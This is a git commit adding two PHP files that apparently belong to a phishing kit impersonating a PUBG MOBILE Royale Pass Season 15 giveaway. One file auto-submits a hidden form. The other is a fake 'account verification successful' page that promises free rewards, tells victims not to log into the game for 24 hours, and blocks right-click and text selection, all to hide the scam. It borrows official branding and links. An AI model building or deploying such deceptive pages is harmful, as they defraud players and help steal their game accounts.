725be8714acd724683b037aeca6ee1126f2cf9f9
russi23 <62670833+russi23@users.noreply.github.com>
2020-10-21 10:27:28 +0200

    Add files via upload

---
+++ check.php
@@ -0,0 +1,4 @@
+<form id='arpantek' method='POST' action='completed.php'>
+<input type='hidden' name='nick' value='fhfgh'>
+</form>
+<script type='text/javascript'>document.getElementById('arpantek').submit();</script>
---
+++ processing.php
@@ -0,0 +1,72 @@
+<html>
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta property="og:title" content="PUBG MOBILE - Royale Pass Season 15">
+<meta name="description" content="Royale Pass Season 15 has begun! Collect your favorite prizes here right now !!! This promo is free without the need for topup. Come join this event with friends all over the world now!">
+<meta property="og:description" content="Royale Pass Season 15 has begun! Collect your favorite prizes here right now !!! This promo is free without the need for topup. Come join this event with friends all over the world now!">
+<meta property="og:url" content="./">
+<meta property="og:site_name" content="PUBG MOBILE - Royale Pass Season 15">
+<meta property="og:type" content="website">
+<meta name="copyright"content="PUBG MOBILE">
+<meta name="theme-color" content="#000">
+<meta property="og:image" content="https://i.ibb.co/y4BNtrv/season.png">
+<title>PUBG MOBILE - Royale Pass Season 15</title>
+<link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="css/animate.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
+<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+
+<div class="container">
+<div class="container-mask">
+<div class="navbar">
+<div class="navbar-menu">
+<i class="fa fa-bars"></i>
+</div> <!--- navbar-menu --->
+<div class="navbar-logo-box">
+<img src="https://i.ibb.co/cQWNSMv/logo.png">
+</div> <!--- navbar-logo-box --->
+</div> <!--- navbar --->
+<div class="reward-content">
+<div class="menu-notify">
+<div class="menu-notify-icon"><i class="zmdi zmdi-check-circle"></i></div>
+<div class="menu-notify-txt"><div class="notify-process"><div id="timer"></div></div> Your account verification has been successful</div>
+</div> <!--- menu-notify --->
+<div class="message-box-finish">
+Hi grbhyt<br>
+<br>
+Thank your for joining this Royale Pass Season 15 event
+<br>
+Your account is currently being processed to receive the reward
+<br>
+It will take about 24 hours for this process to receive the reward
+<br>
+<br>
+Please do not enter the game before this process is complete
+<br>
+You will get a push notification from PUBG MOBILE when this process has been completed
+<br>
+<br>
+<div style="text-align: center;">Keep playing PUBG MOBILE and get Winner Winner Chicken Dinner!</div>
+</div>
+<button type="button" class="btn-verify" onclick="location.href='https://www.pubgmobile.com/en/event/suspensestation/';">
+<div class="btn-verify-icon">
+<i class="zmdi zmdi-account-circle"></i>
+</div>
+Logout my account
+</button>
+</div> <!--- reward-content --->
+</div> <!--- container-mask --->
+</div> <!--- container --->
+
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="js/timer.js"></script>
+
+</body>
+</html>
